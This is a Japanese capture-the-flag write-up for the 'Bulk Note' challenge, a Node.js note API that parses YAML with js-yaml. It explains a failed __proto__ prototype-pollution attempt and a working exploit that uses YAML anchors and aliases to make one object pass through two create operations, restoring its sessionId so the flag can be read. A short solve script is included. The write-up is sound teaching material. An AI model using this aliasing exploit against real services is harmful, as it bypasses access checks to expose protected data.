# Bulk Note

https://alpacahack.com/daily-bside/challenges/bulk-note

## 問題の概要

Node.js サーバーでグローバル変数

```ts
const note = new Map<string, Object>();
```

に対して Create, Get 操作を行う API `POST /` が提供されています。

request body は YAML 形式で渡す必要があり、[js-yaml](https://www.npmjs.com/package/js-yaml) でパースされます。

### リクエストのスキーマ

`POST /` は複数の操作の配列 `(CreateCommand | GetCommand)[]` を受け取り、順に処理された結果が配列 `(CreateResponse | GetResponse)[]` で返されます。

### Create 処理

Create 処理は `note` に新しいエントリを追加し、`id` を返します。

```ts
interface CreateCommand {
  command: "create";
  content: string;
  isHidden: boolean;
}

interface CreateResponse {
  command: "create";
  id: string;
}
```

`isHidden` が `true` の場合、`content` は `FLAG` に置き換えられ、`sessionId` と `isHidden` はエントリから削除されます。

```js
const id = randomUUID();
doc.sessionId = sessionId;
if (doc.isHidden) {
  doc.content = FLAG;
  delete doc.sessionId;
  delete doc.isHidden;
}
notes.set(id, doc);

return [{ command: "create", id }, null];
```

### Get 処理

Get 処理は `id` に対応するエントリーを `note` から取得します。

```ts
interface GetCommand {
  command: "get";
  id: string;
}

interface GetResponse {
  command: "get";
  id: string;
  content: string;
}
```

取得したエントリーの `sessionId` が一致するかを確認してから `content` を返します。

```js
const note = notes.get(id);
if (!note || !note.sessionId || note.sessionId !== sessionId) {
  return [null, { error: "not found", index }];
}

return [{ command: "get", id, content: note.content }, null];
```

## 解法

普通に Create/Get 操作を行う場合、フラグを含むエントリは `sessionId` が削除されるため Get 操作で取得できません。

方針として考えられるのは次の 2 点です。

1. `sessionId` が削除されないようなオブジェクトを作る
2. 同じ参照のオブジェクトを複数回処理させ、`sessionId` を後から書き換える

1 については、

```js
{
  command: "create",
  content: "",
  isHidden: true,
  __proto__: {
    sessionId: "some-session-id"
  }
}
```

のようなオブジェクトを渡すことができれば、`delete doc.sessionId` を実行しても `doc.__proto__.sessionId` は削除されずに残り、プロトタイプチェーンを通じて `doc.sessionId` としてアクセス可能です。

しかし、`js-yaml` では `key === "__proto__"` の場合は `Object.defineProperty` を使ってプロパティを定義しており、`sessionId` をプロトタイプチェーンに置くことはできませんでした。

2 について、[YAML の仕様](https://yaml.org/spec/1.2.2/#alias-nodes) を調べたところ、

```yaml
{ "anchored": &A1 "value", "alias": *A1 }
```

のように `value` へのアンカー `&A1` を定義し、`*A1` で同じ値を再利用することができることがわかりました。

`js-yaml` で Object へのアンカーが同じオブジェクトへの参照になれば、次のようなリクエストを送ることで `sessionId` を後から書き換えることができます。

```yaml
[&doc { command: create, content: "", isHidden: true }, *doc]
```

1 回目の Create 操作では `{ command: "create", content: "", isHidden: true}` が(参照渡しで)渡され、`{ command: "create", content: "<FLAG>" }` に書き換えられて `note` に保存されます。

2 回目の Create 操作では書き換えられた `{ command: "create", content: "<FLAG>" }` が渡され、`sessionId` が追加されます。

最終的に `note` は

```js
{
  "<uuid1>": { command: "create", content: "<FLAG>", sessionId: "<sessionId>" },
  "<uuid2>": { command: "create", content: "<FLAG>", sessionId: "<sessionId>" },
}
```

のように `<uuid1>` と `<uuid2>` が同じオブジェクトを参照する形になっており、`<uuid1>` もしくは `<uuid2>` に対して Get 操作を行うことでフラグを取得できます。

## 解答に使用したコード

`sid` は Create 操作の時点で `"a"` などの適当な値を設定して固定できますが、shared サーバーで他の参加者と sid が被って意図せずにフラグを取得してしまう可能性があるため、Create 操作のレスポンスから `sid` を取得するようにしています。

```ts
const res_create = await fetch(`${url}`, {
  method: "POST",
  body: `[&doc {command: create, content: "", isHidden: true}, *doc]`,
});

const sid = res_create.headers.get("set-cookie")?.match(/sid=([^;]+)/)?.[1];
const id = (await res_create.json()).results[0].id;

const res_get = await fetch(`${url}`, {
  method: "POST",
  headers: {
    Cookie: `sid=${sid}`,
  },
  body: `[{command: get, id: ${id}}]`,
});

console.log((await res_get.json()).results[0].content);
```
